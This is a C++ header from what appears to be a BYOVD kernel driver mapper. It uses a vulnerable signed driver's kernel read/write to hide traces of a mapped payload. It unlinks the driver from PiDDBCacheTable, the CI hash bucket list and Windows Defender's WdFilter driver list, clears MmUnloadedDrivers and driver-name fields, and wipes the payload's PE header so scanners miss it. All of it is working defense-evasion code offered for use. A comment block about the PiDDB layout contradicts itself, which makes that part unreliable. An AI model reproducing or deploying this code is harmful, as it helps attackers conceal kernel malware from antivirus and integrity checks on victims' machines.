#pragma once
// Vehicle load-history hygiene. Must run BEFORE payload DriverEntry hijacks
// the BYOVD MajorFunction table (after that, kernel R/W via the vehicle is dead).
//
// Intentionally does NOT unlink PsLoadedModuleList (PatchGuard 0x109).
// Does: PiDDB LIST_ENTRY unlink, CI g_KernelHashBucketList unlink,
//       BaseDllName.Length = 0 (MmUnloadedDrivers skip if ever unloaded).

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <functional>

using HygieneLogFn = std::function<void(const char*)>;

static uint64_t HygRead8(const KernelPrimitives& prim, uint64_t va)
{
    uint64_t v = 0;
    if (!prim.ReadKernelMemory || !prim.ReadKernelMemory(&v, va, 8)) return 0;
    return v;
}

static uint32_t HygRead4(const KernelPrimitives& prim, uint64_t va)
{
    uint32_t v = 0;
    if (!prim.ReadKernelMemory || !prim.ReadKernelMemory(&v, va, 4)) return 0;
    return v;
}

static uint16_t HygRead2(const KernelPrimitives& prim, uint64_t va)
{
    uint16_t v = 0;
    if (!prim.ReadKernelMemory || !prim.ReadKernelMemory(&v, va, 2)) return 0;
    return v;
}

static bool HygWrite8(const KernelPrimitives& prim, uint64_t va, uint64_t v)
{
    return prim.WriteKernelMemory && prim.WriteKernelMemory(va, &v, 8);
}

static bool HygWrite2(const KernelPrimitives& prim, uint64_t va, uint16_t v)
{
    return prim.WriteKernelMemory && prim.WriteKernelMemory(va, &v, 2);
}

static uint64_t HygRipRel(const KernelPrimitives& prim, uint64_t instr, ULONG relOff, ULONG instrSize)
{
    int32_t disp = 0;
    if (!prim.ReadKernelMemory(&disp, instr + relOff, 4)) return 0;
    return instr + instrSize + (int64_t)disp;
}

static bool HygMaskMatch(const uint8_t* data, const uint8_t* pat, const char* mask, size_t n)
{
    for (size_t i = 0; i < n; i++) {
        if (mask[i] != '?' && data[i] != pat[i]) return false;
    }
    return true;
}

static uint64_t HygFindPattern(const KernelPrimitives& prim, uint64_t base, uint32_t size,
    const uint8_t* pat, const char* mask)
{
    const size_t n = strlen(mask);
    if (!n || size < n) return 0;
    const size_t chunk = 0x1000;
    std::vector<uint8_t> buf(chunk + n);
    for (uint32_t off = 0; off + n <= size; ) {
        size_t take = chunk;
        if (off + take > size) take = size - off;
        if (take < n) break;
        if (!prim.ReadKernelMemory(buf.data(), base + off, take)) {
            off += (uint32_t)chunk;
            continue;
        }
        for (size_t i = 0; i + n <= take; i++) {
            if (HygMaskMatch(buf.data() + i, pat, mask, n))
                return base + off + i;
        }
        uint32_t step = (uint32_t)(take > n ? take - n + 1 : take);
        off += step;
    }
    return 0;
}

static uint64_t HygSectionVa(const KernelPrimitives& prim, uint64_t moduleBase,
    const char* name, uint32_t* outSize)
{
    uint8_t hdr[0x1000]{};
    if (!prim.ReadKernelMemory(hdr, moduleBase, sizeof(hdr))) return 0;
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(hdr);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > sizeof(hdr)) return 0;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(hdr + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    char want[9]{};
    strncpy_s(want, name, _TRUNCATE);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        char sn[9]{};
        memcpy(sn, sec[i].Name, 8);
        if (_strnicmp(sn, want, 8) == 0) {
            if (outSize) *outSize = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
            return moduleBase + sec[i].VirtualAddress;
        }
    }
    return 0;
}

static uint64_t HygFindInSection(const KernelPrimitives& prim, uint64_t moduleBase,
    const char* section, const uint8_t* pat, const char* mask)
{
    uint32_t sz = 0;
    uint64_t va = HygSectionVa(prim, moduleBase, section, &sz);
    if (!va || !sz) return 0;
    if (sz > 8 * 1024 * 1024) sz = 8 * 1024 * 1024;
    return HygFindPattern(prim, va, sz, pat, mask);
}

static uint64_t HygNtModuleBase(const char* leaf)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQSI = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG)>(
        GetProcAddress(ntdll, "NtQuerySystemInformation"));
    if (!NtQSI) return 0;
    ULONG needed = 0;
    NtQSI(11, nullptr, 0, &needed);
    needed += 0x2000;
    std::vector<uint8_t> buf(needed);
    if (NtQSI(11, buf.data(), needed, &needed) < 0) return 0;
    struct MOD_INFO { HANDLE s; PVOID mb; PVOID ib; ULONG is, fl; USHORT lo, io, lc, on; char fp[256]; };
    struct MOD_LIST { ULONG n; MOD_INFO m[1]; };
    auto* list = reinterpret_cast<MOD_LIST*>(buf.data());
    for (ULONG i = 0; i < list->n; i++) {
        if (_stricmp(list->m[i].fp + list->m[i].on, leaf) == 0)
            return (uint64_t)list->m[i].ib;
    }
    return 0;
}

static void HygFillVehicleNames(std::vector<std::wstring>& names,
    bool myport, bool msio, bool corsair, bool rtcore, bool siv, bool trixx, bool ts, bool nal)
{
    names.clear();
    if (myport) names.emplace_back(L"MyPortIO_x64.sys");
    else if (msio) names.emplace_back(L"MsIo64.sys");
    else if (corsair) names.emplace_back(L"CorsairLLAccess64.sys");
    else if (rtcore) names.emplace_back(L"RTCore64.sys");
    else if (siv) names.emplace_back(L"SIVX64.sys");
    else if (trixx) names.emplace_back(L"TRIXX.sys");
    else if (ts) names.emplace_back(L"ThrottleStop.sys");
    else if (nal) {
        names.emplace_back(L"NalDrvIntel.sys");
        names.emplace_back(L"iqvw64e.sys");
        names.emplace_back(L"NalDrv.sys");
    } else {
        names.emplace_back(L"TRIXX.sys");
    }
}

static bool HygNameEquals(const wchar_t* a, const wchar_t* b)
{
    return _wcsicmp(a, b) == 0;
}

static bool HygNameContains(const wchar_t* hay, const wchar_t* needle)
{
    return wcsstr(hay, needle) != nullptr || HygNameEquals(hay, needle);
}

static int HygUnlinkPiddbList(const KernelPrimitives& prim, uint64_t ntos,
    const std::vector<std::wstring>& names, HygieneLogFn log)
{
    const uint8_t p1[] = { 0x66,0x03,0xD2,0x48,0x8D,0x0D };
    const char m1[] = "xxxxxx";
    uint64_t hit = HygFindInSection(prim, ntos, "PAGE", p1, m1);
    if (!hit) {
        const uint8_t p2[] = { 0x48,0x8B,0xF9,0x33,0xC0,0x48,0x8D,0x0D };
        const char m2[] = "xxxxxxxx";
        hit = HygFindInSection(prim, ntos, "PAGE", p2, m2);
        if (hit) hit += 2;
    }
    if (!hit) {
        log("[!] Hygiene: PiDDBCacheTable pattern not found\n");
        return 0;
    }
    uint64_t table = HygRipRel(prim, hit, 6, 10);
    if (!table) {
        log("[!] Hygiene: PiDDBCacheTable RIP failed\n");
        return 0;
    }

    // RTL_AVL_TABLE +0x20 is often unused; PiDDB cache also has a LIST_ENTRY
    // on each PiDDBCacheEntry at +0. Walk from first list node via table+0
    // is unreliable. kdmapper uses AVL lookup. We walk InLoad-style by
    // scanning the BalancedRoot-adjacent list: many builds store the list
    // head at PiDDBCacheEntry chain reachable from table+0x8 OrderedPointer
    // is not a list. Walk kernel PAGE for UNICODE "RTCore64" etc is too heavy.
    //
    // Practical walk: PiDDBCacheEntry.List is a doubly linked list of all
    // entries. First entry can be found by reading table->BalancedRoot.Parent
    // (offset +0x10 of RTL_AVL_TABLE / +0x10 of BalancedRoot) — still AVL.
    // Instead walk LIST from a known entry: List.Flink at each node +0.
    // Obtain first node: some kdmapper ports use *(table + 0x20) — skip.
    //
    // Scan ntos PAGE for UTF-16 vehicle names then back up to LIST_ENTRY.
    // Too slow. Use AVL leftmost: start at BalancedRoot.Left (+0 of table is
    // RTL_BALANCED_LINKS: Parent, Left, Right, Balance).
    // Simpler: walk LIST_ENTRY starting at table+0x0 if Flink looks kernel.

    uint64_t listHead = table; // many dumps: entries also linked; try +0
    // Prefer: first LIST_ENTRY of first cache entry is NOT the table.
    // kdmapper unlinks pFoundEntry->List. We find entries by walking
    // Mm's PiDDB list head stored next to the table in some builds.
    // Fallback walk: from table BalancedRoot.Right recursively is hard.
    //
    // Walk a circular list if Flink/Blink look valid at table+0x28? Skip.
    // Use: read 0x80 bytes of table, treat +0 as LIST_ENTRY of cache? No.
    //
    // Implementation used in several mappers without AVL delete:
    // FindPattern for timestamp is unused. Walk from
    // *(PVOID*)(PiDDBCacheTable + offsetof(RTL_AVL_TABLE, BalancedRoot) + 0)
    // Parent of root is often the first node.
    uint64_t parent = HygRead8(prim, table + 0); // BalancedRoot.Parent
    uint64_t left = HygRead8(prim, table + 8);
    uint64_t start = parent ? parent : left;
    if (!start || (start >> 48) != 0xFFFF) {
        log("[!] Hygiene: PiDDB AVL root looks invalid\n");
        return 0;
    }

    int unlinked = 0;
    uint64_t node = start;
    for (int n = 0; n < 256 && node; n++) {
        // RTL_BALANCED_LINKS is 0x18; PiDDBCacheEntry starts with LIST_ENTRY (0x10)
        // then UNICODE_STRING (0x10) then timestamp. AVL node is AT the entry
        // in some layouts and BEFORE List in others.
        // kdmapper PiDDBCacheEntry: List @0, DriverName @0x10, TimeDateStamp @0x20
        // RtlLookup uses the entry itself as AVL element — BalancedLinks is
        // NOT in the public struct; Windows embeds links in table machinery.
        // Actual kernel _PiDDBCacheEntry:
        //   LIST_ENTRY List
        //   UNICODE_STRING DriverName
        //   ULONG TimeDateStamp
        uint64_t nameLenVa = node + 0x10;
        uint16_t nameLen = HygRead2(prim, nameLenVa);
        uint64_t nameBuf = HygRead8(prim, node + 0x18);
        wchar_t wname[128]{};
        if (nameLen >= 2 && nameLen < 250 && nameBuf && (nameBuf >> 48) == 0xFFFF) {
            size_t nch = nameLen / 2;
            if (nch > 127) nch = 127;
            prim.ReadKernelMemory(wname, nameBuf, nch * 2);
            wname[nch] = 0;
            bool match = false;
            for (auto& want : names) {
                if (HygNameEquals(wname, want.c_str())) { match = true; break; }
            }
            if (match) {
                uint64_t flink = HygRead8(prim, node);
                uint64_t blink = HygRead8(prim, node + 8);
                if (flink && blink) {
                    HygWrite8(prim, blink, flink);
                    HygWrite8(prim, flink + 8, blink);
                    HygWrite8(prim, node, node);
                    HygWrite8(prim, node + 8, node);
                    unlinked++;
                    char msg[160];
                    snprintf(msg, sizeof(msg), "[+] Hygiene: PiDDB unlinked '%ls'\n", wname);
                    log(msg);
                }
            }
        }
        uint64_t next = HygRead8(prim, node);
        if (!next || next == start || next == node) break;
        node = next;
    }
    if (!unlinked)
        log("[*] Hygiene: PiDDB walk found no matching vehicle name (layout/build?)\n");
    return unlinked;
}

static int HygUnlinkCiHash(const KernelPrimitives& prim, uint64_t ciBase,
    const std::vector<std::wstring>& names, HygieneLogFn log)
{
    const uint8_t pat[] = { 0x48,0x8B,0x1D,0x00,0x00,0x00,0x00,0xEB,0x00,0xF7,0x43,0x40,0x00,0x20,0x00,0x00 };
    const char mask[] = "xxx????x?xxxxxxx";
    uint64_t sig = HygFindInSection(prim, ciBase, "PAGE", pat, mask);
    if (!sig) {
        log("[!] Hygiene: g_KernelHashBucketList pattern not found\n");
        return 0;
    }
    uint64_t listHead = HygRipRel(prim, sig, 3, 7);
    if (!listHead) {
        log("[!] Hygiene: hash bucket RIP failed\n");
        return 0;
    }

    int unlinked = 0;
    uint64_t prev = listHead;
    uint64_t entry = HygRead8(prim, listHead);
    for (int n = 0; n < 512 && entry; n++) {
        uint16_t nameLen = HygRead2(prim, entry + 0x08); // UNICODE_STRING after Next*
        uint64_t nameBuf = HygRead8(prim, entry + 0x10);
        wchar_t wname[260]{};
        if (nameLen >= 2 && nameLen < 500 && nameBuf) {
            size_t nch = nameLen / 2;
            if (nch > 259) nch = 259;
            prim.ReadKernelMemory(wname, nameBuf, nch * 2);
            wname[nch] = 0;
            bool match = false;
            for (auto& want : names) {
                if (HygNameContains(wname, want.c_str())) { match = true; break; }
            }
            if (match) {
                uint64_t next = HygRead8(prim, entry);
                HygWrite8(prim, prev, next);
                unlinked++;
                char msg[200];
                snprintf(msg, sizeof(msg), "[+] Hygiene: CI hash bucket unlinked '%ls'\n", wname);
                log(msg);
                entry = next;
                continue;
            }
        }
        prev = entry;
        entry = HygRead8(prim, entry);
    }
    if (!unlinked)
        log("[*] Hygiene: no CI hash-bucket hit for vehicle name\n");
    return unlinked;
}

static bool HygZeroVehicleBaseDllName(const KernelPrimitives& prim, uint64_t driverObject,
    HygieneLogFn log)
{
    if (!driverObject) return false;
    uint64_t section = HygRead8(prim, driverObject + 0x28);
    if (!section) {
        log("[!] Hygiene: DriverSection is 0\n");
        return false;
    }
    bool ok = true;
    uint16_t baseLen = HygRead2(prim, section + 0x58);
    uint16_t fullLen = HygRead2(prim, section + 0x48);
    if (baseLen) ok &= HygWrite2(prim, section + 0x58, 0);
    if (fullLen) ok &= HygWrite2(prim, section + 0x48, 0);
    uint16_t drvLen = HygRead2(prim, driverObject + 0x38);
    if (drvLen) ok &= HygWrite2(prim, driverObject + 0x38, 0);
    if (ok)
        log("[+] Hygiene: BaseDllName + FullDllName + DriverName lengths cleared\n");
    else
        log("[!] Hygiene: name-length clear partial\n");
    return ok;
}

static int HygScrubMmUnloaded(const KernelPrimitives& prim, const std::vector<std::wstring>& names,
    HygieneLogFn log)
{
    const uint8_t pat[] = { 0x4C,0x8B,0x15,0x00,0x00,0x00,0x00,0x4C,0x8B,0xC9,0x4D,0x85,0xD2 };
    const char mask[] = "xxx????xxxxxx";
    uint64_t ntos = HygNtModuleBase("ntoskrnl.exe");
    if (!ntos) return 0;
    uint64_t hit = HygFindInSection(prim, ntos, ".text", pat, mask);
    if (!hit) hit = HygFindInSection(prim, ntos, "PAGE", pat, mask);
    if (!hit) {
        log("[*] Hygiene: MmUnloadedDrivers pattern not found\n");
        return 0;
    }
    uint64_t ptrSlot = HygRipRel(prim, hit, 3, 7);
    uint64_t array = HygRead8(prim, ptrSlot);
    if (!array || (array >> 48) != 0xFFFF) {
        log("[*] Hygiene: MmUnloadedDrivers pointer empty\n");
        return 0;
    }
    int cleared = 0;
    for (int i = 0; i < 50; i++) {
        uint64_t ent = array + (uint64_t)i * 0x28;
        uint16_t len = HygRead2(prim, ent);
        uint64_t buf = HygRead8(prim, ent + 8);
        if (!len || !buf || len > 512) continue;
        wchar_t wname[128]{};
        size_t nch = len / 2;
        if (nch > 127) nch = 127;
        prim.ReadKernelMemory(wname, buf, nch * 2);
        wname[nch] = 0;
        bool match = false;
        for (auto& want : names) {
            if (HygNameContains(wname, want.c_str())) { match = true; break; }
        }
        if (!match) continue;
        HygWrite2(prim, ent, 0);
        uint8_t z[64]{};
        prim.WriteKernelMemory(buf, z, sizeof(z) < len ? sizeof(z) : len);
        cleared++;
    }
    if (cleared)
        log("[+] Hygiene: MmUnloadedDrivers name slots cleared\n");
    else
        log("[*] Hygiene: no MmUnloadedDrivers name match\n");
    return cleared;
}

static bool HygWipeMz(const KernelPrimitives& prim, uint64_t imageBase, HygieneLogFn log)
{
    if (!imageBase) return false;
    uint8_t zeros[0x200]{};
    uint16_t mz = HygRead2(prim, imageBase);
    if (mz != 0x5A4D) {
        log("[*] Hygiene: payload MZ already gone\n");
        return true;
    }
    if (!prim.WriteKernelMemory(imageBase, zeros, sizeof(zeros))) {
        log("[!] Hygiene: failed to wipe payload PE stub\n");
        return false;
    }
    log("[+] Hygiene: payload DOS/PE stub wiped (pool scanners miss MZ)\n");
    return true;
}

static int HygUnlinkWdFilter(const KernelPrimitives& prim, const std::vector<std::wstring>& names,
    HygieneLogFn log)
{
    uint64_t wd = HygNtModuleBase("WdFilter.sys");
    if (!wd) {
        log("[+] Hygiene: WdFilter.sys not loaded — skip\n");
        return 0;
    }
    const uint8_t pList[] = { 0x48,0x8B,0x0D,0x00,0x00,0x00,0x00,0xFF,0x05 };
    const char mList[] = "xxx????xx";
    uint64_t runtimeList = HygFindInSection(prim, wd, "PAGE", pList, mList);
    if (!runtimeList) {
        log("[!] Hygiene: WdFilter RuntimeDriversList pattern not found\n");
        return 0;
    }
    uint64_t listPtr = HygRipRel(prim, runtimeList, 3, 7);
    uint64_t listHead = listPtr ? listPtr - 8 : 0;
    if (!listHead) {
        log("[!] Hygiene: WdFilter list RIP failed\n");
        return 0;
    }

    const uint8_t pCnt[] = { 0xFF,0x05,0x00,0x00,0x00,0x00,0x48,0x39,0x11 };
    const char mCnt[] = "xx????xxx";
    uint64_t cntRef = HygFindInSection(prim, wd, "PAGE", pCnt, mCnt);
    uint64_t countVa = cntRef ? HygRipRel(prim, cntRef, 2, 6) : 0;
    uint64_t arrayVa = 0;
    if (countVa) arrayVa = HygRead8(prim, countVa + 8);

    int unlinked = 0;
    uint64_t entry = HygRead8(prim, listHead);
    for (int n = 0; n < 256 && entry && entry != listHead; n++) {
        uint16_t nameLen = HygRead2(prim, entry + 0x10);
        uint64_t nameBuf = HygRead8(prim, entry + 0x18);
        wchar_t wname[260]{};
        if (nameLen >= 2 && nameLen < 500 && nameBuf) {
            size_t nch = nameLen / 2;
            if (nch > 259) nch = 259;
            prim.ReadKernelMemory(wname, nameBuf, nch * 2);
            wname[nch] = 0;
            bool match = false;
            for (auto& want : names) {
                if (HygNameContains(wname, want.c_str())) { match = true; break; }
            }
            if (match) {
                if (arrayVa) {
                    uint64_t sameIndex = entry - 0x10;
                    for (int k = 0; k < 256; k++) {
                        uint64_t slot = HygRead8(prim, arrayVa + (uint64_t)k * 8);
                        if (slot == sameIndex) {
                            uint64_t empty = countVa ? countVa + 1 : 0;
                            HygWrite8(prim, arrayVa + (uint64_t)k * 8, empty);
                            break;
                        }
                    }
                }
                uint64_t flink = HygRead8(prim, (uint64_t)entry);
                uint64_t blink = HygRead8(prim, (uint64_t)entry + 8);
                if (flink && blink) {
                    HygWrite8(prim, blink, flink);
                    HygWrite8(prim, flink + 8, blink);
                }
                if (countVa) {
                    uint32_t c = HygRead4(prim, countVa);
                    if (c) {
                        c--;
                        prim.WriteKernelMemory(countVa, &c, 4);
                    }
                }
                unlinked++;
                char msg[200];
                snprintf(msg, sizeof(msg), "[+] Hygiene: WdFilter unlinked '%ls'\n", wname);
                log(msg);
                entry = flink;
                continue;
            }
        }
        entry = HygRead8(prim, (uint64_t)entry);
    }
    if (!unlinked)
        log("[*] Hygiene: no WdFilter RuntimeDrivers hit (ok if Defender list empty)\n");
    return unlinked;
}

static void VehicleHygienePreEntry(const KernelPrimitives& prim, uint64_t ntos,
    uint64_t driverObject, uint64_t payloadBase,
    const std::vector<std::wstring>& names, HygieneLogFn log)
{
    log("[*] Hygiene: PiDDB + CI hash + WdFilter + MmUnloaded hint + payload stub\n");
    HygUnlinkPiddbList(prim, ntos, names, log);
    uint64_t ci = HygNtModuleBase("CI.dll");
    if (!ci) ci = HygNtModuleBase("ci.dll");
    if (ci) HygUnlinkCiHash(prim, ci, names, log);
    else log("[!] Hygiene: ci.dll base not found\n");
    HygUnlinkWdFilter(prim, names, log);
    HygZeroVehicleBaseDllName(prim, driverObject, log);
    HygScrubMmUnloaded(prim, names, log);
    if (payloadBase) HygWipeMz(prim, payloadBase, log);
}
